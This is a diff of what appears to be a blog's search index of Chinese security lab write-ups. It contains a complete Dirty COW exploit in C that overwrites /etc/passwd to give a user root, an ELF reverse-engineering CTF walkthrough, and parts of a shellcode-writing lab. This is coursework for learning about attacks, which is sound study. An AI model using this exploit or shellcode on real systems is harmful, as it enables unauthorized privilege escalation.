class="string">&quot;********&quot;</span>;</span><br><span class="line">   <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">      lseek(f, offset, SEEK_SET);</span><br><span class="line">      <span class="comment">// Write to the memory.</span></span><br><span class="line">      write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="task2"><a class="markdownIt-Anchor" href="#task2"></a> Task2</h2>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pthread_t</span> pth1,pth2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="type">int</span> file_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  file_size = st.st_size;</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the position of the target area</span></span><br><span class="line">  <span class="type">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;charlie&quot;</span>);                        </span><br><span class="line"></span><br><span class="line">  <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">  pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="type">void</span>  *)file_size); </span><br><span class="line">  pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position);             </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">  pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;   </span><br><span class="line">  <span class="type">char</span> *content=<span class="string">&quot;charlie:x:0:1002:,,,,,,,:/home/charlie:/bin/bash&quot;</span> ;</span><br><span class="line">  <span class="type">off_t</span> offset = (<span class="type">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">    lseek(f, offset, SEEK_SET);</span><br><span class="line">    <span class="comment">// Write to the memory.</span></span><br><span class="line">    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> file_size = (<span class="type">int</span>) arg;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>逆向工程与汇编语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Program-Compilation-and-ELF-Format-Lab-2</title>
-    <url>/posts/54097cbd.html</url>
-    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
-<p>1、学习在 Linux 操作系统上进行分析所需的基本工具。</p>
-<p>2、找出隐藏在 payload 中的 flag。</p>
-<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
-<p>使用常用分析工具。</p>
-<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
-<p>使用 binary 虚拟机，即在 Lab 1 中已经配置过的环境（包括时间戳）。</p>
-<h1 id="task-1使用-file-解决类型问题"><a class="markdownIt-Anchor" href="#task-1使用-file-解决类型问题"></a> Task 1：使用 file 解决类型问题</h1>
-<p>步骤：</p>
-<p>1、进入 chapter5 文件中，使用 file payload 指令查看 payload 文件的类型。</p>
-<p>2、使用 head payload 指令查看 payload 文件前十行得内容。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.1.png" alt="输出结果" /></p>
-<p>Q：这个文件使用了什么编码方式？</p>
-<p>A：进入在线分析网站 <a href="https://www.boxentriq.com/code-breaking/cipher-identifier">https://www.boxentriq.com/code-breaking/cipher-identifier</a> 中分析可得该编码方式为 base64 编码。并且，判断一段文本是否为 Base64 编码可以使用以下几个方法:</p>
-<p>检查字符集:Base64 编码只使用 A-Z、a-z、0-9 和 +/= 这 64 个字符。如果一段文本只包含这些字符,那很可能是 Base64 编码的。</p>
-<p>检查长度:Base64 编码后的字符串长度通常是 4 的倍数。如果一段文本的长度是 4 的倍数,那也很可能是 Base64 编码的。</p>
-<p>检查结尾:Base64 编码的结尾通常会有 = 或 == 来表示编码字符串的长度不是 4 的倍数。</p>
-<p>尝试解码:可以尝试使用 base64 命令对该文本进行解码,如果解码成功并且内容可读,那就证明该文本是 Base64 编码的。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.2.png" alt="输出结果" /></p>
-<p>3、输入 base64 -d payload &gt; decoded_payload 指令解码 payload 文件并将解码内容保存在 decoded_payload 文件中</p>
-<p>4、输入 file decode_payload 指令发现无法打开该文件，输入 file -c decode_payload 指令发现该压缩文件中有两个文件 ctf 和 67b8601。</p>
-<p>5、输入 tar zxvf decoded_payload 指令解压该文件，输入 file ctf 指令发现该文件为一个 ELF 文件，输入 file 67b8601 指令发现该文件为一个 PC bitmap 文件。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.3.png" alt="输出结果" /></p>
-<p>Q：这两个文件分别是什么类型？</p>
-<p>A：ctf文件是一个该文件为一个 ELF 文件，67b8601文件为一个 PC bitmap 文件。</p>
-<h1 id="task-2使用-ldd-探索依赖性"><a class="markdownIt-Anchor" href="#task-2使用-ldd-探索依赖性"></a> Task 2：使用 ldd 探索依赖性</h1>
-<p>步骤：</p>
-<p>1、输入 ./ctf 指令，动态链接器会提示缺少某个库文件。</p>
-<p>2、输入 ldd ctf 指令，显示出共享库和依赖关系。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/2.1.png" alt="输出结果" /></p>
-<p>Q：这个文件存在哪些未解析的依赖项？</p>
-<p>A：从给出的 ldd 命令输出结果可以看出，存在一个未解析的依赖项 <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a>。</p>
-<p>3、输入 grep 'ELF' ./* 指令，查看所有 ELF 文件的头部信息，发现&quot;ELF&quot;字符出现在了 67b8601 文件中（输入 grep 'ELF' 67b8601 指令可以发现）。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/2.2.png" alt="输出结果" /></p>
-<h1 id="task-3使用-xxd-查看文件内容"><a class="markdownIt-Anchor" href="#task-3使用-xxd-查看文件内容"></a> Task 3：使用 xxd 查看文件内容</h1>
-<p>步骤：</p>
-<p>输入 xxd 67b8601 | head -n 15 指令分析 67b8601 文件的前 15 行。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/3.1.png" alt="输出结果" /></p>
-<p>Q：xxd 默认每行显示多少字节的内容？</p>
-<p>A：xxd 默认每行显示16字节的内容。</p>
-<h1 id="task-4使用-readelf-解析并提取-elf-库文件"><a class="markdownIt-Anchor" href="#task-4使用-readelf-解析并提取-elf-库文件"></a> Task 4：使用 readelf 解析并提取 ELF 库文件</h1>
-<p>步骤：</p>
-<p>1、0x7f 在偏移量为 0x35 的位置处，转换为10进制为53，因此输入 tail -c +53 67b8601 &gt; temp_elf 指令截取从偏移量 0x35 到文件末尾。</p>
-<p>2、输入 readelf -h temp_elf 指令查看 temp_elf 文件的 ELF 头部信息。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.1.png" alt="输出结果" /></p>
-<p>3、由上图可知，Start of section headers = 8568 (bytes into file)，Size of section headers = 64 (bytes)，Number of section headers = 27，由此可知 size = 10296。输入head -c 10296 temp_elf &gt; <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令将 temp_elf 文件中开头至偏移量为 10296 的内容截取到 <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 文件中。</p>
-<p>4、输入 export LD_LIBRARY_PATH=/home/binary/code/chapter5 指令将当前目录添加到 LD_LIBRARY_PATH 环境变量中。</p>
-<p>5、输入 .\ctf 指令，发现程序成功运行，没有报错。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.2.png" alt="输出结果" /></p>
-<p>Q：是否一定要去除隐藏的 ELF 文件的尾部无效部分？不去除的情况下这个库文件是否还有效？</p>
-<p>A：不一定。这个库文件依然是有效的。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/4.3.png" alt="输出结果" /></p>
-<h1 id="task-5使用-nm-解析符号"><a class="markdownIt-Anchor" href="#task-5使用-nm-解析符号"></a> Task 5：使用 nm 解析符号</h1>
-<p>步骤：</p>
-<p>1、输入 echo $? 指令，发现其中包含的 ctf 退出状态为 1，表示有错误。</p>
-<p>2、输入 readelf -s <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，查看库文件的符号表。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.1.png" alt="输出结果" /></p>
-<p>3、输入 nm <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，显示 no symbols，说明文件已经被剥离。</p>
-<p>4、输入 nm -D <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，获得被修饰的符号名称。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.2.png" alt="输出结果" /></p>
-<p>5、输入 nm -D --demangle <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a> 指令，获得多个有意义的函数。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/5.3.png" alt="输出结果" /></p>
-<pre><code>......
-0000000000000c60 T rc4_decrypt(rc4_state_t*, unsigned char*, int)
-0000000000000c70 T rc4_decrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)
-0000000000000b40 T rc4_encrypt(rc4_state_t*, unsigned char*, int)
-0000000000000bc0 T rc4_encrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)
-0000000000000cb0 T rc4_init(rc4_state_t*, unsigned char*, int)
-                 U std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_create(unsigned long&amp;, unsigned long)
-                 U std::__throw_logic_error(char const*)
-</code></pre>
-<p>Q：是哪个加密算法？包含了这个加密算法的什么功能？</p>
-<p>A：这是一个包含RC4加密算法实现的库文件。这个文件包含的与RC4加密相关的函数有:rc4_init(rc4_state_t*, unsigned char*, int) - 初始化RC4加密状态,使用给定的密钥。rc4_encrypt(rc4_state_t*, unsigned char*, int) - 使用RC4加密给定的明文数据。rc4_decrypt(rc4_state_t*, unsigned char*, int) - 使用RC4解密给定的密文数据。还有一些重载函数如rc4_encrypt和rc4_decrypt接受std::string类型的数据。</p>
-<h1 id="task-6使用-strings-查找-hints"><a class="markdownIt-Anchor" href="#task-6使用-strings-查找-hints"></a> Task 6：使用 strings 查找 Hints</h1>
-<p>步骤：</p>
-<p>输入 strings ctf 指令查看二进制文件的字符串，并未找到有关的指令或者内容字符。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/6.1.png" alt="输出结果" /></p>
-<h1 id="task-7使用-strace-和-ltrace-跟踪系统调用和库文件调用"><a class="markdownIt-Anchor" href="#task-7使用-strace-和-ltrace-跟踪系统调用和库文件调用"></a> Task 7：使用 strace 和 ltrace 跟踪系统调用和库文件调用</h1>
-<p>步骤：</p>
-<p>1、输入 strace ./ctf show_me_the_flag 指令获得跟踪 ctf 的系统调用行为。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.1.png" alt="输出结果" /></p>
-<pre><code>......
-write(1, &quot;checking 'show_me_the_flag'\n&quot;, 28checking 'show_me_the_flag') = 28
-write(1, &quot;ok\n&quot;, 3ok) = 3
-exit_group(1) = ?
-</code></pre>
-<p>Q：这 3 个系统调用分别是做什么的？</p>
-<p>A：向终端输出 &quot;checking 'show_me_the_flag'\n&quot;；向终端输出 &quot;ok\n&quot;；终止当前进程及其子进程，退出状态码为 1。</p>
-<p>2、输入 ltrace -i -C ./ctf show_me_the_flag 指令可以看到初始化了加密函数，该函数位于之前提取的库文件中；接着为一个 C++ 字符串赋值，大概是用加密消息对其进行初始化；然后调用解密函数解密此消息，并将解密后的消息分配到新的 C++ 字符串。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.2.png" alt="输出结果" /></p>
-<pre><code>[0x400fe9] __libc_start_main(0x400bc0, 2, 0x7ffcb01844d8, 0x4010c0 &lt;unfinished ...&gt;
-[0x400c44] __printf_chk(1, 0x401158, 0x7ffcb01862da, 160checking 'show_me_the_flag')    = 28
-[0x400c51] strcmp(&quot;show_me_the_flag&quot;, &quot;show_me_the_flag&quot;)    = 0
-[0x400cf0] puts(&quot;ok&quot;ok) = 3
-[0x400d07] rc4_init(rc4_state_t*, unsigned char*, int)(0x7ffcb01842a0, 0x4011c0, 66, -1) = 0
-[0x400d14] std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::assign(char const*)(0x7ffcb01841e0, 0x40117b, 58, 3) = 0x7ffcb01841e0
-[0x400d29] rc4_decrypt(rc4_state_t*, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;)(0x7ffcb0184240, 0x7ffcb01842a0, 0x7ffcb01841e0, 0x7e889f91) = 0x7ffcb0184240
-[0x400d36] std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::_M_assign(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;)(0x7ffcb01841e0, 0x7ffcb0184240, 0x7ffcb0184250, 0) = 0
-[0x400d53] getenv(&quot;GUESSME&quot;)                                 = nil
-[0xffffffffffffffff] +++ exited (status 1) +++
-</code></pre>
-<p>3、输入 GUESSME='foobar' ./ctf show_me_the_flag 指令，将 GUESSME 环境变量设置为虚拟值，发现输出新的一行，提示再猜一次。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.3.png" alt="输出结果" /></p>
-<p>4、输入 GUESSME=&quot;123&quot; ltrace -i -C ./ctf show_me_the_fla 指令，ctf 继续分配并解密另一个 C++ 字符串，但是看不到有关 GUESSME 的任何提示。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/7.4.png" alt="输出结果" /></p>
-<h1 id="task-8使用-objdump-检查指令级别的行为"><a class="markdownIt-Anchor" href="#task-8使用-objdump-检查指令级别的行为"></a> Task 8：使用 objdump 检查指令级别的行为</h1>
-<p>步骤：</p>
-<p>1、输入 objdump -d -M intel ctf 指令，</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.1.png" alt="输出结果" /></p>
-<pre><code>ctf:     file format elf64-x86-64
-
-Contents of section .rodata:
- 401140 01000200 44454255 473a2061 7267765b  ....DEBUG: argv[
- 401150 315d203d 20257300 63686563 6b696e67  1] = %s.checking
- 401160 20272573 270a0073 686f775f 6d655f74   '%s'..show_me_t
- 401170 68655f66 6c616700 6f6b004f 89df919f  he_flag.ok.O....
- 401180 887e009a 5b38babe 27ac0e3e 434d6285  .~..[8..'..&gt;CMb.
- 401190 55868954 3848a34d 00192d76 40505e3a  U..T8H.M..-v@P^:
- 4011a0 00726200 666c6167 203d2025 730a0067  .rb.flag = %s..g
- 4011b0 75657373 20616761 696e2100 00000000  uess again!.....
- 4011c0 49742773 206b696e 6461206c 696b6520  It's kinda like 
- 4011d0 4c6f7569 7369616e 612e204f 72204461  Louisiana. Or Da
- 4011e0 676f6261 682e2044 61676f62 6168202d  gobah. Dagobah -
- 4011f0 20576865 72652059 6f646120 6c697665   Where Yoda live
- 401200 73210000 00000000                    s!......   
-</code></pre>
-<p>Q：&quot;guess again&quot;存放的地址位置是什么？</p>
-<p>A：0x4011af到0x4011b9。</p>
-<p>2、输入 objdump -d -M intel ctf 指令，查看&quot;guess again&quot;周围的指令。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.2.png" alt="输出结果" /></p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/8.3.png" alt="输出结果" /></p>
-<h1 id="task-9使用-gdb-转存动态字符串缓冲区"><a class="markdownIt-Anchor" href="#task-9使用-gdb-转存动态字符串缓冲区"></a> Task 9：使用 GDB 转存动态字符串缓冲区</h1>
-<p>步骤：</p>
-<p>1、输入 gdb ./ctf 进入gbd调试程序。</p>
-<p>2、由于 rcx 出现的地址为 0x400dc8，输入 break *0x400dc8 指令设置断点。</p>
-<p>3、输入 set env GUESSME=123 指令设置 GUESSME 值为 123，输入 run show_me_the_flag 指令运行该程序，输入 output (char* )rcx 指令获得 rcx 指向的字符串&quot;Crackers Don't Matter&quot;。</p>
-<p>4、输入 quit 指令推出 gbd 调试，输入 GUESSME=&quot;Crackers Don't Matter&quot; ./ctf show_me_the_flag 指令获得最终的 flag = 84b34c124b2ba5ca224af8e33b077e9e。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/9.1.png" alt="输出结果" /></p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/9.2.png" alt="输出结果" /></p>
 ]]></content>
       <categories>
         <category>逆向工程与汇编语言</category>
@@ -1260,11 +1110,11 @@ print(s)
    db '/usr/bin/env*-*a=11*b=22*AAAABBBBCCCCDDDDEEEE'
 </code></pre>
 <p>生成 mysh2.o文件后，输入 <code>objdump -Mintel --disassemble mysh2.o</code>获取机器码，发现机器码中没有0。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.2.png" alt="函数 one 的机器码" />{width=&quot;10cm&quot;}</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.3.png" alt="函数 two 的机器码" />{width=&quot;10cm&quot;}</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.2.png" alt="函数 one 的机器码" /><br />
+<img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.3.png" alt="函数 two 的机器码" /></p>
 <p>生成 mysh2 文件后，输入 mysh2<br />
 指令，发现成功生成了要求内容，代码编写成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.1.png" alt="运行结果" />{width=&quot;10cm&quot;}</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/2.1.png" alt="运行结果" /></p>
 <h2 id="task-3编写-64-位-shellcode"><a class="markdownIt-Anchor" href="#task-3编写-64-位-shellcode"></a> Task 3：编写 64 位 shellcode</h2>
 <p>思路：与 Task1.b 类似，但由于是 64 位 shellcode，因此每个数都必须是 8 的倍数。因此我们将字符串 &quot;h########&quot; 存储在 rax 中，然后将其左移 56 位，再右移 56 位，这样就得到了字符串 h。然后将其 push 到栈中。接着我们 push 字符串 &quot;/bas/bin&quot;，于是我们得到了字符串 /bin/bash0。代码如下：</p>
 <pre><code>section .text
@@ -1288,9 +1138,9 @@ print(s)
       syscall
 </code></pre>
 <p>生成 mysh_64.o文件后，输入 <code>objdump -Mintel --disassemble mysh_64.o</code>获取机器码，发现机器码中没有0。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/3.2.png" alt="获取机器码" />{width=&quot;10cm&quot;}</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/3.2.png" alt="获取机器码" /></p>
 <p>生成 mysh_64 文件后，输入 <code>mysh_64</code>指令，发现成功生成了要求内容，代码编写成功。</p>
-<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/3.1.png" alt="运行结果" />{width=&quot;10cm&quot;}</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Shellcode-Development-Lab/3.1.png" alt="运行结果" /></p>
 <h1 id="代码附录"><a class="markdownIt-Anchor" href="#代码附录"></a> 代码附录</h1>
 <h2 id="task-1b"><a class="markdownIt-Anchor" href="#task-1b"></a> Task 1.b</h2>
 <pre><code>section .text
@@ -1469,6 +1319,156 @@ print(s)
       </categories>
       <tags>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Program-Compilation-and-ELF-Format-Lab-2</title>
+    <url>/posts/54097cbd.html</url>
+    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<p>1、学习在 Linux 操作系统上进行分析所需的基本工具。</p>
+<p>2、找出隐藏在 payload 中的 flag。</p>
+<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
+<p>使用常用分析工具。</p>
+<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
+<p>使用 binary 虚拟机，即在 Lab 1 中已经配置过的环境（包括时间戳）。</p>
+<h1 id="task-1使用-file-解决类型问题"><a class="markdownIt-Anchor" href="#task-1使用-file-解决类型问题"></a> Task 1：使用 file 解决类型问题</h1>
+<p>步骤：</p>
+<p>1、进入 chapter5 文件中，使用 file payload 指令查看 payload 文件的类型。</p>
+<p>2、使用 head payload 指令查看 payload 文件前十行得内容。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.1.png" alt="输出结果" /></p>
+<p>Q：这个文件使用了什么编码方式？</p>
+<p>A：进入在线分析网站 <a href="https://www.boxentriq.com/code-breaking/cipher-identifier">https://www.boxentriq.com/code-breaking/cipher-identifier</a> 中分析可得该编码方式为 base64 编码。并且，判断一段文本是否为 Base64 编码可以使用以下几个方法:</p>
+<p>检查字符集:Base64 编码只使用 A-Z、a-z、0-9 和 +/= 这 64 个字符。如果一段文本只包含这些字符,那很可能是 Base64 编码的。</p>
+<p>检查长度:Base64 编码后的字符串长度通常是 4 的倍数。如果一段文本的长度是 4 的倍数,那也很可能是 Base64 编码的。</p>
+<p>检查结尾:Base64 编码的结尾通常会有 = 或 == 来表示编码字符串的长度不是 4 的倍数。</p>
+<p>尝试解码:可以尝试使用 base64 命令对该文本进行解码,如果解码成功并且内容可读,那就证明该文本是 Base64 编码的。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.2.png" alt="输出结果" /></p>
+<p>3、输入 base64 -d payload &gt; decoded_payload 指令解码 payload 文件并将解码内容保存在 decoded_payload 文件中</p>
+<p>4、输入 file decode_payload 指令发现无法打开该文件，输入 file -c decode_payload 指令发现该压缩文件中有两个文件 ctf 和 67b8601。</p>
+<p>5、输入 tar zxvf decoded_payload 指令解压该文件，输入 file ctf 指令发现该文件为一个 ELF 文件，输入 file 67b8601 指令发现该文件为一个 PC bitmap 文件。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/1.3.png" alt="输出结果" /></p>
+<p>Q：这两个文件分别是什么类型？</p>
+<p>A：ctf文件是一个该文件为一个 ELF 文件，67b8601文件为一个 PC bitmap 文件。</p>
+<h1 id="task-2使用-ldd-探索依赖性"><a class="markdownIt-Anchor" href="#task-2使用-ldd-探索依赖性"></a> Task 2：使用 ldd 探索依赖性</h1>
+<p>步骤：</p>
+<p>1、输入 ./ctf 指令，动态链接器会提示缺少某个库文件。</p>
+<p>2、输入 ldd ctf 指令，显示出共享库和依赖关系。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/2.1.png" alt="输出结果" /></p>
+<p>Q：这个文件存在哪些未解析的依赖项？</p>
+<p>A：从给出的 ldd 命令输出结果可以看出，存在一个未解析的依赖项 <a href="http://lib5ae9b7f.so">lib5ae9b7f.so</a>。</p>
+<p>3、输入 grep 'ELF' ./* 指令，查看所有 ELF 文件的头部信息，发现&quot;ELF&quot;字符出现在了 67b8601 文件中（输入 grep 'ELF' 67b8601 指令可以发现）。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/2.2.png" alt="输出结果" /></p>
+<h1 id="task-3使用-xxd-查看文件内容"><a class="markdownIt-Anchor" href="#task-3使用-xxd-查看文件内容"></a> Task 3：使用 xxd 查看文件内容</h1>
+<p>步骤：</p>
+<p>输入 xxd 67b8601 | head -n 15 指令分析 67b8601 文件的前 15 行。</p>
+<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-2/3.1.png" alt="输出结果" /></p>
+<p>Q：xxd 默认每行显示多少字节的内容？</p>
+<p>A：xxd 默认每行显示16字节的内容。</p>
+<h1 id="task-4使用-readelf-解析并提取-elf-库文件"><a class="markdownIt-Anchor" href="#task-4使用-readelf-解析并提取-elf-库文件"></a> Task 4：使用 readelf 解析并提取 ELF 库文件</h1>
+<p>步骤：</p>
+<p>1、0x7f 在偏移量为 0x35 的位置处，转换为10进制为53，因此输入 tail -c +53 67b8601 &gt; temp_elf 指令截取从偏移量 0x35 到文件末尾。</p>
+<p>2、输入 readelf -h temp_elf 指令查看 temp_elf 文件的 ELF 头部信息。</p>
